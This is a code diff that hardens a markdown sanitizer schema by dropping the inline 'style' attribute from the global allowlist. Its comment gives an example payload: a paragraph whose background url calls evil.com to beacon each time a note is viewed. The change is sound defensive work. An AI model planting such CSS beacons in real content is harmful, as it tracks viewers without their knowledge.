@@ -420,8 +420,16 @@ const sanitizeSchema = {
   // NOTE: rehype-sanitize uses HAST property names, not HTML attribute names.
   // Standard markdown code fences emit `className` (array); our custom remark
   // plugins set `class` (string). We allow both so both paths survive.
+  //
+  // `style` is intentionally NOT in the global allowlist. hast-util-sanitize
+  // does not parse CSS values, so an attacker-authored note could do
+  // `<p style="background:url(https://evil.com/beacon?u=X)">x</p>` — which
+  // fires a GET to the attacker every time the rendered note is viewed
+  // (including by anonymous viewers of shared links). Drop `style`
+  // globally; KaTeX / mermaid outputs go through their own pipelines
+  // that don't need author-supplied inline styles to survive.
   attributes: {
-    "*": ["className", "class", "style", "id", "title", "data-mermaid-source", "data-language"],
+    "*": ["className", "class", "id", "title", "data-mermaid-source", "data-language"],
     a: ["href", "target", "rel"],
     img: ["src", "alt", "width", "height"],
     input: ["type", "checked", "disabled"],
